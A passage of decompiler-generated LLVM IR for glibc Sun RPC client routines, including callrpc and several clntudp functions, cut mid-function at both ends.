  %v6_80623c432 = phi i32 [ %v6_80623c427, %dec_label_pc_80623ca.lr.ph ], [ %v6_80623c4, %dec_label_pc_80623c3 ]
  %v2_80623c431 = phi i8 [ %v2_80623c424, %dec_label_pc_80623ca.lr.ph ], [ %v2_80623c4, %dec_label_pc_80623c3 ]
  %v0_80623c329 = phi i32 [ %v4_80623b2, %dec_label_pc_80623ca.lr.ph ], [ %v1_80623c3, %dec_label_pc_80623c3 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80623bd14 = load i8, i8* %v1_80623bd13, align 1
  %v3_80623bd15 = zext i8 %v2_80623bd14 to i32
  %v5_80623bd16 = and i32 %v4_80623bd.pre, -256
  %v6_80623bd17 = or i32 %v3_80623bd15, %v5_80623bd16
  store i32 %v6_80623bd17, i32* @ecx, align 4
  %v4_80623bf18 = icmp eq i8 %v2_80623bd14, 0
  %v1_80623c119 = icmp eq i1 %v4_80623bf18, false
  br i1 %v1_80623c119, label %dec_label_pc_80623b8, label %dec_label_pc_80623c3

dec_label_pc_80623ce:                             ; preds = %dec_label_pc_80623c3, %entry
  br label %dec_label_pc_80623d0

dec_label_pc_80623d0:                             ; preds = %dec_label_pc_80623b8, %dec_label_pc_80623ce
  %v0_80623d2 = phi i32 [ 0, %dec_label_pc_80623ce ], [ %v0_80623c329, %dec_label_pc_80623b8 ]
  store i32 %v0_80623ad, i32* @ebx, align 4
  ret i32 %v0_80623d2

; uselistorder directives
  uselistorder i32 %v6_80623bd17, { 2, 0, 1 }
  uselistorder i8 %v2_80623bd14, { 1, 2, 0 }
  uselistorder i32 %v1_80623c3, { 1, 0 }
  uselistorder i32 %v6_80623bd, { 1, 2, 0 }
  uselistorder i8 %v2_80623bd, { 1, 2, 0 }
  uselistorder i32 %v1_80623bc, { 2, 1, 0 }
  uselistorder i8 %v2_80623c424, { 0, 2, 1 }
  uselistorder i32 %v0_80623ad, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80623d0, { 1, 0 }
  uselistorder label %dec_label_pc_80623ca, { 1, 0 }
  uselistorder label %dec_label_pc_80623c3, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80623d4 = load i32, i32* @ebx, align 4
  store i32 %v0_80623d4, i32* %stack_var_-4, align 4
  %v1_80623d8 = call i32 @__rpc_thread_variables(i32 %v0_80623d4)
  %v1_80623dd = add i32 %v1_80623d8, 164
  %v2_80623dd = inttoptr i32 %v1_80623dd to i32*
  %v3_80623dd = load i32, i32* %v2_80623dd, align 4
  store i32 %v3_80623dd, i32* @ebx, align 4
  %v1_80623e3 = icmp eq i32 %v3_80623dd, 0
  br i1 %v1_80623e3, label %dec_label_pc_8062406, label %dec_label_pc_80623e7

dec_label_pc_80623e7:                             ; preds = %entry
  %v1_80623e7 = inttoptr i32 %v3_80623dd to i32*
  %v2_80623e7 = load i32, i32* %v1_80623e7, align 4
  %v1_80623e9 = icmp eq i32 %v2_80623e7, 0
  br i1 %v1_80623e9, label %dec_label_pc_80623fa, label %dec_label_pc_80623ed

dec_label_pc_80623ed:                             ; preds = %dec_label_pc_80623e7
  %v1_80623f0 = add i32 %v2_80623e7, 4
  %v2_80623f0 = inttoptr i32 %v1_80623f0 to i32*
  %v3_80623f0 = load i32, i32* %v2_80623f0, align 4
  %v5_80623f4 = add i32 %v3_80623f0, 16
  %v6_80623f4 = inttoptr i32 %v5_80623f4 to i32*
  %v7_80623f4 = load i32, i32* %v6_80623f4, align 4
  call void @__pseudo_call(i32 %v7_80623f4)
  br label %dec_label_pc_80623fa

dec_label_pc_80623fa:                             ; preds = %dec_label_pc_80623e7, %dec_label_pc_80623ed
  %v1_80623fe = call i32 @free(i32 %v3_80623dd)
  br label %dec_label_pc_8062406

dec_label_pc_8062406:                             ; preds = %entry, %dec_label_pc_80623fa
  %v2_8062406 = load i32, i32* %stack_var_-12, align 4
  %v2_8062408 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8062408, i32* @ebx, align 4
  ret i32 %v2_8062406

; uselistorder directives
  uselistorder i32 %v3_80623dd, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8062406, { 1, 0 }
  uselistorder label %dec_label_pc_80623fa, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-1120 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v1_806242f = call i32 @__rpc_thread_variables(i32 0)
  store i32 %v1_806242f, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %v1_806242f, i32* @ebx, align 4
  %v1_8062439 = add i32 %v1_806242f, 164
  %v2_8062439 = inttoptr i32 %v1_8062439 to i32*
  %v3_8062439 = load i32, i32* %v2_8062439, align 4
  store i32 %v3_8062439, i32* @esi, align 4
  %v1_806243f = icmp eq i32 %v3_8062439, 0
  %v1_8062441 = icmp eq i1 %v1_806243f, false
  br i1 %v1_8062441, label %dec_label_pc_8062463, label %dec_label_pc_8062443

dec_label_pc_8062443:                             ; preds = %entry
  %v3_8062449 = call i32 @calloc(i64 1, i32 24)
  store i32 %v3_8062449, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8062455 = icmp eq i32 %v3_8062449, 0
  br i1 %v1_8062455, label %dec_label_pc_8062614, label %dec_label_pc_806245d

dec_label_pc_806245d:                             ; preds = %dec_label_pc_8062443
  %v1_806245d = load i32, i32* @ebx, align 4
  %v2_806245d = add i32 %v1_806245d, 164
  %v3_806245d = inttoptr i32 %v2_806245d to i32*
  store i32 %v3_8062449, i32* %v3_806245d, align 4
  %v0_8062463.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8062463

dec_label_pc_8062463:                             ; preds = %entry, %dec_label_pc_806245d
  %v0_8062463 = phi i32 [ %v3_8062439, %entry ], [ %v0_8062463.pre, %dec_label_pc_806245d ]
  %v1_8062463 = add i32 %v0_8062463, 20
  %v2_8062463 = inttoptr i32 %v1_8062463 to i32*
  %v3_8062463 = load i32, i32* %v2_8062463, align 4
  %v4_8062463 = icmp eq i32 %v3_8062463, 0
  %v1_8062467 = icmp eq i1 %v4_8062463, false
  br i1 %v1_8062467, label %dec_label_pc_8062486, label %dec_label_pc_8062469

dec_label_pc_8062469:                             ; preds = %dec_label_pc_8062463
  %v1_8062471 = call i32 @malloc(i32 256)
  %v2_8062471 = inttoptr i32 %v1_8062471 to i8*
  store i32 %v1_8062471, i32* %eax.global-to-local, align 4
  %v2_8062479 = load i32, i32* @esi, align 4
  %v3_8062479 = add i32 %v2_8062479, 20
  %v4_8062479 = inttoptr i32 %v3_8062479 to i32*
  store i32 %v1_8062471, i32* %v4_8062479, align 4
  store i8 0, i8* %v2_8062471, align 1
  %v0_806247f = load i32, i32* @esi, align 4
  %v1_806247f = add i32 %v0_806247f, 4
  %v2_806247f = inttoptr i32 %v1_806247f to i32*
  store i32 -1, i32* %v2_806247f, align 4
  %v0_8062486.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8062486

dec_label_pc_8062486:                             ; preds = %dec_label_pc_8062463, %dec_label_pc_8062469
  %v0_806249e = phi i32 [ %v0_8062463, %dec_label_pc_8062463 ], [ %v0_8062486.pre, %dec_label_pc_8062469 ]
  %v1_8062486 = add i32 %v0_806249e, 16
  %v2_8062486 = inttoptr i32 %v1_8062486 to i32*
  %v3_8062486 = load i32, i32* %v2_8062486, align 4
  %v4_8062486 = icmp eq i32 %v3_8062486, 0
  br i1 %v4_8062486, label %dec_label_pc_80624b1, label %dec_label_pc_806248c

dec_label_pc_806248c:                             ; preds = %dec_label_pc_8062486
  %v1_806248c = add i32 %v0_806249e, 8
  %v2_806248c = inttoptr i32 %v1_806248c to i32*
  %v3_806248c = load i32, i32* %v2_806248c, align 4
  %v4_806248c = load i32, i32* @edi, align 4
  %v15_806248c = icmp eq i32 %v3_806248c, %v4_806248c
  %v1_806248f = icmp eq i1 %v15_806248c, false
  br i1 %v1_806248f, label %dec_label_pc_80624b1, label %dec_label_pc_8062491

dec_label_pc_8062491:                             ; preds = %dec_label_pc_806248c
  store i32 %arg3, i32* @eax, align 4
  %v1_8062494 = add i32 %v0_806249e, 12
  %v2_8062494 = inttoptr i32 %v1_8062494 to i32*
  %v3_8062494 = load i32, i32* %v2_8062494, align 4
  %v15_8062494 = icmp eq i32 %v3_8062494, %arg3
  %v1_8062497 = icmp eq i1 %v15_8062494, false
  br i1 %v1_8062497, label %dec_label_pc_80624b1, label %dec_label_pc_8062499

dec_label_pc_8062499:                             ; preds = %dec_label_pc_8062491
  %v1_806249e = add i32 %v0_806249e, 20
  %v2_806249e = inttoptr i32 %v1_806249e to i32*
  %v3_806249e = load i32, i32* %v2_806249e, align 4
  %v3_80624a1 = inttoptr i32 %v3_806249e to i8*
  %v4_80624a1 = call i32 @__GI_strcoll(i8* %v3_80624a1)
  store i32 %v4_80624a1, i32* %eax.global-to-local, align 4
  %v1_80624a9 = icmp eq i32 %v4_80624a1, 0
  br i1 %v1_80624a9, label %dec_label_pc_80625d4, label %dec_label_pc_8062499.dec_label_pc_80624b1_crit_edge

dec_label_pc_8062499.dec_label_pc_80624b1_crit_edge: ; preds = %dec_label_pc_8062499
  %v0_80624b1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80624b1

dec_label_pc_80624b1:                             ; preds = %dec_label_pc_8062499.dec_label_pc_80624b1_crit_edge, %dec_label_pc_8062491, %dec_label_pc_806248c, %dec_label_pc_8062486
  %v0_80624b1 = phi i32 [ %v0_80624b1.pre, %dec_label_pc_8062499.dec_label_pc_80624b1_crit_edge ], [ %v0_806249e, %dec_label_pc_8062491 ], [ %v0_806249e, %dec_label_pc_806248c ], [ %v0_806249e, %dec_label_pc_8062486 ]
  %v1_80624b1 = add i32 %v0_80624b1, 4
  %v2_80624b1 = inttoptr i32 %v1_80624b1 to i32*
  %v3_80624b1 = load i32, i32* %v2_80624b1, align 4
  store i32 %v3_80624b1, i32* %eax.global-to-local, align 4
  %v1_80624b4 = add i32 %v0_80624b1, 16
  %v2_80624b4 = inttoptr i32 %v1_80624b4 to i32*
  store i32 0, i32* %v2_80624b4, align 4
  %v0_80624bb = load i32, i32* %eax.global-to-local, align 4
  %v10_80624bb = icmp eq i32 %v0_80624bb, -1
  br i1 %v10_80624bb, label %dec_label_pc_80624d3, label %dec_label_pc_80624c0

dec_label_pc_80624c0:                             ; preds = %dec_label_pc_80624b1
  %v1_80624c4 = call i32 @__libc_close(i32 %v0_80624bb)
  store i32 %v1_80624c4, i32* %eax.global-to-local, align 4
  %v0_80624c9 = load i32, i32* @esi, align 4
  %v1_80624c9 = add i32 %v0_80624c9, 4
  %v2_80624c9 = inttoptr i32 %v1_80624c9 to i32*
  store i32 -1, i32* %v2_80624c9, align 4
  br label %dec_label_pc_80624d3

dec_label_pc_80624d3:                             ; preds = %dec_label_pc_80624b1, %dec_label_pc_80624c0
  %v0_80624d3 = load i32, i32* @esi, align 4
  %v1_80624d3 = inttoptr i32 %v0_80624d3 to i32*
  %v2_80624d3 = load i32, i32* %v1_80624d3, align 4
  %v1_80624d5 = icmp eq i32 %v2_80624d3, 0
  br i1 %v1_80624d5, label %dec_label_pc_80624ec, label %dec_label_pc_80624d9

dec_label_pc_80624d9:                             ; preds = %dec_label_pc_80624d3
  %v1_80624dc = add i32 %v2_80624d3, 4
  %v2_80624dc = inttoptr i32 %v1_80624dc to i32*
  %v3_80624dc = load i32, i32* %v2_80624dc, align 4
  store i32 %v3_80624dc, i32* %eax.global-to-local, align 4
  store i32 134620387, i32* %stack_var_-112, align 4
  %v5_80624e0 = add i32 %v3_80624dc, 16
  %v6_80624e0 = inttoptr i32 %v5_80624e0 to i32*
  %v7_80624e0 = load i32, i32* %v6_80624e0, align 4
  call void @__pseudo_call(i32 %v7_80624e0)
  %v0_80624e3 = load i32, i32* @esi, align 4
  %v1_80624e3 = inttoptr i32 %v0_80624e3 to i32*
  store i32 0, i32* %v1_80624e3, align 4
  br label %dec_label_pc_80624ec

dec_label_pc_80624ec:                             ; preds = %dec_label_pc_80624d3, %dec_label_pc_80624d9
  store i32 1024, i32* @ebx, align 4
  %v8_80624fb = ptrtoint i32* %stack_var_-1120 to i32
  %v2_806252b = ptrtoint i32* %stack_var_-28 to i32
  %v2_806252f = ptrtoint i32* %stack_var_-24 to i32
  %v2_8062533 = ptrtoint i32* %stack_var_-64 to i32
  %v0_8062529.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062529

dec_label_pc_8062500:                             ; preds = %dec_label_pc_8062548, %dec_label_pc_8062529
  %v3_8062500 = load i32, i32* %stack_var_-28, align 4
  %v13_8062500 = icmp eq i32 %v3_8062500, -1
  %v1_8062504 = icmp eq i1 %v13_8062500, false
  br i1 %v1_8062504, label %dec_label_pc_806260f, label %dec_label_pc_806250a

dec_label_pc_806250a:                             ; preds = %dec_label_pc_8062500
  %v0_806250a = load i32, i32* %stack_var_-112, align 4
  %v1_806250a = call i32 @__errno_location(i32 %v0_806250a)
  store i32 %v1_806250a, i32* %eax.global-to-local, align 4
  %v1_806250f = inttoptr i32 %v1_806250a to i32*
  %v2_806250f = load i32, i32* %v1_806250f, align 4
  %v11_806250f = icmp eq i32 %v2_806250f, 34
  %v1_8062512 = icmp eq i1 %v11_806250f, false
  br i1 %v1_8062512, label %dec_label_pc_806260f, label %dec_label_pc_8062518

dec_label_pc_8062518:                             ; preds = %dec_label_pc_806250a
  %v0_8062518 = load i32, i32* @ebx, align 4
  %v2_8062518 = mul i32 %v0_8062518, 2
  store i32 %v2_8062518, i32* @ebx, align 4
  %v1_806251a = add i32 %v2_8062518, 30
  %v1_806251d = and i32 %v1_806251a, -16
  store i32 %v1_806251d, i32* %eax.global-to-local, align 4
  %v0_8062520 = load i32, i32* @esp, align 4
  %v2_8062520 = sub i32 %v0_8062520, %v1_806251d
  %v1_8062522 = add i32 %v2_8062520, 15
  %v1_8062526 = and i32 %v1_8062522, -16
  br label %dec_label_pc_8062529

dec_label_pc_8062529:                             ; preds = %dec_label_pc_80624ec, %dec_label_pc_8062518
  %v0_8062536 = phi i32 [ 1024, %dec_label_pc_80624ec ], [ %v2_8062518, %dec_label_pc_8062518 ]
  %v0_8062529 = phi i32 [ %v0_8062529.pre, %dec_label_pc_80624ec ], [ %v1_806251d, %dec_label_pc_8062518 ]
  %storemerge = phi i32 [ %v8_80624fb, %dec_label_pc_80624ec ], [ %v1_8062526, %dec_label_pc_8062518 ]
  store i32 %v2_8062533, i32* %eax.global-to-local, align 4
  %v8_806253c = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull %stack_var_-64, i32 %storemerge, i32 %v0_8062536, i32 %v2_806252f, i32 %v2_806252b, i32 %v0_8062529)
  store i32 %v8_806253c, i32* %eax.global-to-local, align 4
  %v1_8062544 = icmp eq i32 %v8_806253c, 0
  %v1_8062546 = icmp eq i1 %v1_8062544, false
  br i1 %v1_8062546, label %dec_label_pc_8062500, label %dec_label_pc_8062548

dec_label_pc_8062548:                             ; preds = %dec_label_pc_8062529
  %v3_8062548 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8062548, i32* %eax.global-to-local, align 4
  %v1_806254b = icmp eq i32 %v3_8062548, 0
  br i1 %v1_806254b, label %dec_label_pc_8062500, label %dec_label_pc_806254f

dec_label_pc_806254f:                             ; preds = %dec_label_pc_8062548
  %v1_8062561 = add i32 %v3_8062548, 12
  %v2_8062561 = inttoptr i32 %v1_8062561 to i32*
  %v3_8062561 = load i32, i32* %v2_8062561, align 4
  %v1_8062564 = add i32 %v3_8062548, 16
  %v2_8062564 = inttoptr i32 %v1_8062564 to i32*
  %v3_8062564 = load i32, i32* %v2_8062564, align 4
  store i32 %v3_8062564, i32* %eax.global-to-local, align 4
  %v2_8062567 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8062567, i32* @ebx, align 4
  %v1_806256a = inttoptr i32 %v3_8062564 to i32*
  %v2_806256a = load i32, i32* %v1_806256a, align 4
  %v3_806256d = bitcast i32* %stack_var_-40 to i16*
  %v4_806256d = call i32 @memcpy(i16* %v3_806256d, i32 %v2_806256a, i32 %v3_8062561)
  %v0_8062573 = load i32, i32* @esi, align 4
  %v1_8062573 = add i32 %v0_8062573, 4
  store i32 %v1_8062573, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_806258d = load i32, i32* @edi, align 4
  %v6_806258f = call i32 @__GI_clntudp_create(i32 %v2_8062567, i32 %v0_806258d, i32 %arg3, i32 5, i32 0, i32 %v1_8062573)
  store i32 %v6_806258f, i32* %eax.global-to-local, align 4
  %v1_8062597 = load i32, i32* @esi, align 4
  %v2_8062597 = inttoptr i32 %v1_8062597 to i32*
  store i32 %v6_806258f, i32* %v2_8062597, align 4
  %v1_8062599 = icmp eq i32 %v6_806258f, 0
  %v1_806259b = icmp eq i1 %v1_8062599, false
  br i1 %v1_806259b, label %dec_label_pc_80625a6, label %dec_label_pc_806259d

dec_label_pc_806259d:                             ; preds = %dec_label_pc_806254f
  %v0_806259d = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_806259d, i32* %eax.global-to-local, align 4
  %v1_80625a2 = inttoptr i32 %v0_806259d to i32*
  %v2_80625a2 = load i32, i32* %v1_80625a2, align 4
  store i32 %v2_80625a2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062614

dec_label_pc_80625a6:                             ; preds = %dec_label_pc_806254f
  %v0_80625a6 = load i32, i32* @esi, align 4
  %v1_80625a6 = add i32 %v0_80625a6, 16
  %v2_80625a6 = inttoptr i32 %v1_80625a6 to i32*
  store i32 1, i32* %v2_80625a6, align 4
  %v0_80625ad = load i32, i32* @edi, align 4
  %v1_80625ad = load i32, i32* @esi, align 4
  %v2_80625ad = add i32 %v1_80625ad, 8
  %v3_80625ad = inttoptr i32 %v2_80625ad to i32*
  store i32 %v0_80625ad, i32* %v3_80625ad, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_80625b3 = load i32, i32* @esi, align 4
  %v2_80625b3 = add i32 %v1_80625b3, 12
  %v3_80625b3 = inttoptr i32 %v2_80625b3 to i32*
  store i32 %arg3, i32* %v3_80625b3, align 4
  %v0_80625bf = load i32, i32* @esi, align 4
  %v1_80625bf = add i32 %v0_80625bf, 20
  %v2_80625bf = inttoptr i32 %v1_80625bf to i32*
  %v3_80625bf = load i32, i32* %v2_80625bf, align 4
  %v3_80625c2 = inttoptr i32 %v3_80625bf to i8*
  %v4_80625c2 = call i32 @strncpy(i8* %v3_80625c2, i32 %arg1, i32 255)
  store i32 %v4_80625c2, i32* %eax.global-to-local, align 4
  %v0_80625c7 = load i32, i32* @esi, align 4
  %v1_80625c7 = add i32 %v0_80625c7, 20
  %v2_80625c7 = inttoptr i32 %v1_80625c7 to i32*
  %v3_80625c7 = load i32, i32* %v2_80625c7, align 4
  store i32 %v3_80625c7, i32* %eax.global-to-local, align 4
  %v1_80625cd = add i32 %v3_80625c7, 255
  %v2_80625cd = inttoptr i32 %v1_80625cd to i8*
  store i8 0, i8* %v2_80625cd, align 1
  br label %dec_label_pc_80625d4

dec_label_pc_80625d4:                             ; preds = %dec_label_pc_8062499, %dec_label_pc_80625a6
  %v0_80625e2 = load i32, i32* @esi, align 4
  %v1_80625e2 = inttoptr i32 %v0_80625e2 to i32*
  %v2_80625e2 = load i32, i32* %v1_80625e2, align 4
  store i32 %v2_80625e2, i32* %eax.global-to-local, align 4
  %v1_80625e4 = add i32 %v2_80625e2, 4
  %v2_80625e4 = inttoptr i32 %v1_80625e4 to i32*
  %v3_80625e4 = load i32, i32* %v2_80625e4, align 4
  store i32 %arg6, i32* %stack_var_-112, align 4
  %v5_80625fd = inttoptr i32 %v3_80625e4 to i32*
  %v6_80625fd = load i32, i32* %v5_80625fd, align 4
  call void @__pseudo_call(i32 %v6_80625fd)
  %v0_8062602 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062602 = icmp eq i32 %v0_8062602, 0
  br i1 %v1_8062602, label %dec_label_pc_8062614, label %dec_label_pc_8062606

dec_label_pc_8062606:                             ; preds = %dec_label_pc_80625d4
  %v0_8062606 = load i32, i32* @esi, align 4
  %v1_8062606 = add i32 %v0_8062606, 16
  %v2_8062606 = inttoptr i32 %v1_8062606 to i32*
  store i32 0, i32* %v2_8062606, align 4
  %v0_806261b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062614

dec_label_pc_806260f:                             ; preds = %dec_label_pc_806250a, %dec_label_pc_8062500
  store i32 13, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062614

dec_label_pc_8062614:                             ; preds = %dec_label_pc_80625d4, %dec_label_pc_8062443, %dec_label_pc_8062606, %dec_label_pc_806259d, %dec_label_pc_806260f
  %v0_806261b = phi i32 [ 0, %dec_label_pc_80625d4 ], [ 0, %dec_label_pc_8062443 ], [ %v0_806261b.pre, %dec_label_pc_8062606 ], [ %v2_80625a2, %dec_label_pc_806259d ], [ 13, %dec_label_pc_806260f ]
  ret i32 %v0_806261b

; uselistorder directives
  uselistorder i32 %v2_8062518, { 2, 1, 0 }
  uselistorder i32 %v0_80624bb, { 1, 0 }
  uselistorder i32 %v0_80624b1, { 1, 0 }
  uselistorder i32 %v1_8062471, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 19, 17, 18, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %arg3, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8062614, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_80625d4, { 1, 0 }
  uselistorder label %dec_label_pc_8062529, { 1, 0 }
  uselistorder label %dec_label_pc_80624ec, { 1, 0 }
  uselistorder label %dec_label_pc_80624d3, { 1, 0 }
  uselistorder label %dec_label_pc_8062486, { 1, 0 }
  uselistorder label %dec_label_pc_8062463, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8062623 = add i32 %arg1, 8
  %v2_8062623 = inttoptr i32 %v1_8062623 to i32*
  %v3_8062623 = load i32, i32* %v2_8062623, align 4
  %v1_8062628 = add i32 %v3_8062623, 44
  %v3_8062630 = inttoptr i32 %arg2 to i16*
  %v4_8062630 = call i32 @memcpy(i16* %v3_8062630, i32 %v1_8062628, i32 12)
  ret i32 %v4_8062630
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_8062645 = add i32 %arg1, 8
  %v2_8062645 = inttoptr i32 %v1_8062645 to i32*
  %v3_8062645 = load i32, i32* %v2_8062645, align 4
  %v1_8062648 = add i32 %v3_8062645, 56
  %v1_806264b = inttoptr i32 %v1_8062648 to i32*
  store i32 2, i32* %v1_806264b, align 4
  call void @__pseudo_branch(i32 %arg2)
  ret i32 %v1_8062648
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v0_806265b = load i32, i32* @eax, align 4
  ret i32 %v0_806265b
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg3 to i32
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  %v1_8062668 = add i32 %arg1, 8
  %v2_8062668 = inttoptr i32 %v1_8062668 to i32*
  %v3_8062668 = load i32, i32* %v2_8062668, align 4
  store i32 %v3_8062668, i32* %ecx.global-to-local, align 4
  switch i32 %arg2, label %dec_label_pc_806267c [
    i32 1, label %dec_label_pc_806269b
    i32 2, label %dec_label_pc_80626a8
    i32 3, label %dec_label_pc_80626ca
    i32 4, label %dec_label_pc_80626b0
    i32 5, label %dec_label_pc_80626bd
    i32 6, label %dec_label_pc_80626e1
    i32 8, label %dec_label_pc_8062683
    i32 9, label %dec_label_pc_806268f
    i32 10, label %dec_label_pc_80626e5
    i32 11, label %dec_label_pc_80626ee
    i32 12, label %dec_label_pc_80626f8
    i32 13, label %dec_label_pc_8062702
    i32 14, label %dec_label_pc_806270e
    i32 15, label %dec_label_pc_806271a
  ]

dec_label_pc_806267c:                             ; preds = %entry
  br label %dec_label_pc_8062729

dec_label_pc_8062683:                             ; preds = %entry
  %v1_8062683 = add i32 %v3_8062668, 4
  %v2_8062683 = inttoptr i32 %v1_8062683 to i32*
  store i32 1, i32* %v2_8062683, align 4
  br label %dec_label_pc_8062724

dec_label_pc_806268f:                             ; preds = %entry
  %v1_806268f = add i32 %v3_8062668, 4
  %v2_806268f = inttoptr i32 %v1_806268f to i32*
  store i32 0, i32* %v2_806268f, align 4
  br label %dec_label_pc_8062724

dec_label_pc_806269b:                             ; preds = %entry
  %v2_806269b = load i32, i32* %arg3, align 4
  store i32 %v2_806269b, i32* %edx.global-to-local, align 4
  %v1_806269d = add i32 %tmp7, 4
  %v2_806269d = inttoptr i32 %v1_806269d to i32*
  %v3_806269d = load i32, i32* %v2_806269d, align 4
  %v2_80626a0 = add i32 %v3_8062668, 40
  %v3_80626a0 = inttoptr i32 %v2_80626a0 to i32*
  store i32 %v3_806269d, i32* %v3_80626a0, align 4
  %v0_80626a3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80626a3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80626a3 = add i32 %v1_80626a3, 36
  %v3_80626a3 = inttoptr i32 %v2_80626a3 to i32*
  store i32 %v0_80626a3, i32* %v3_80626a3, align 4
  br label %dec_label_pc_8062724

dec_label_pc_80626a8:                             ; preds = %entry
  %v1_80626a8 = add i32 %v3_8062668, 36
  %v2_80626a8 = inttoptr i32 %v1_80626a8 to i32*
  %v3_80626a8 = load i32, i32* %v2_80626a8, align 4
  store i32 %v3_80626a8, i32* %edx.global-to-local, align 4
  %v1_80626ab = add i32 %v3_8062668, 40
  br label %dec_label_pc_80626c3

dec_label_pc_80626b0:                             ; preds = %entry
  %v2_80626b0 = load i32, i32* %arg3, align 4
  store i32 %v2_80626b0, i32* %edx.global-to-local, align 4
  %v1_80626b2 = add i32 %tmp7, 4
  %v2_80626b2 = inttoptr i32 %v1_80626b2 to i32*
  %v3_80626b2 = load i32, i32* %v2_80626b2, align 4
  %v2_80626b5 = add i32 %v3_8062668, 32
  %v3_80626b5 = inttoptr i32 %v2_80626b5 to i32*
  store i32 %v3_80626b2, i32* %v3_80626b5, align 4
  %v0_80626b8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80626b8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80626b8 = add i32 %v1_80626b8, 28
  %v3_80626b8 = inttoptr i32 %v2_80626b8 to i32*
  store i32 %v0_80626b8, i32* %v3_80626b8, align 4
  br label %dec_label_pc_8062724

dec_label_pc_80626bd:                             ; preds = %entry
  %v1_80626bd = add i32 %v3_8062668, 28
  %v2_80626bd = inttoptr i32 %v1_80626bd to i32*
  %v3_80626bd = load i32, i32* %v2_80626bd, align 4
  store i32 %v3_80626bd, i32* %edx.global-to-local, align 4
  %v1_80626c0 = add i32 %v3_8062668, 32
  br label %dec_label_pc_80626c3

dec_label_pc_80626c3:                             ; preds = %dec_label_pc_80626a8, %dec_label_pc_80626bd
  %storemerge.in.in = phi i32 [ %v1_80626c0, %dec_label_pc_80626bd ], [ %v1_80626ab, %dec_label_pc_80626a8 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_80626c3 = add i32 %tmp7, 4
  %v3_80626c3 = inttoptr i32 %v2_80626c3 to i32*
  store i32 %storemerge, i32* %v3_80626c3, align 4
  %v0_80626c6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80626c6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80626c6 = inttoptr i32 %v1_80626c6 to i32*
  store i32 %v0_80626c6, i32* %v2_80626c6, align 4
  br label %dec_label_pc_8062724

dec_label_pc_80626ca:                             ; preds = %entry
  %v1_80626ca = add i32 %v3_8062668, 8
  %v3_80626d2 = bitcast i32* %arg3 to i16*
  %v4_80626d2 = call i32 @memcpy(i16* %v3_80626d2, i32 %v1_80626ca, i32 16)
  br label %dec_label_pc_8062729

dec_label_pc_80626e1:                             ; preds = %entry
  %v1_80626e1 = inttoptr i32 %v3_8062668 to i32*
  %v2_80626e1 = load i32, i32* %v1_80626e1, align 4
  br label %dec_label_pc_8062716

dec_label_pc_80626e5:                             ; preds = %entry
  %v1_80626e5 = add i32 %v3_8062668, 88
  %v2_80626e5 = inttoptr i32 %v1_80626e5 to i32*
  %v3_80626e5 = load i32, i32* %v2_80626e5, align 4
  %v1_80626e8 = inttoptr i32 %v3_80626e5 to i32*
  %v2_80626e8 = load i32, i32* %v1_80626e8, align 4
  %v1_80626ea = call i32 @llvm.bswap.i32(i32 %v2_80626e8)
  br label %dec_label_pc_8062716

dec_label_pc_80626ee:                             ; preds = %entry
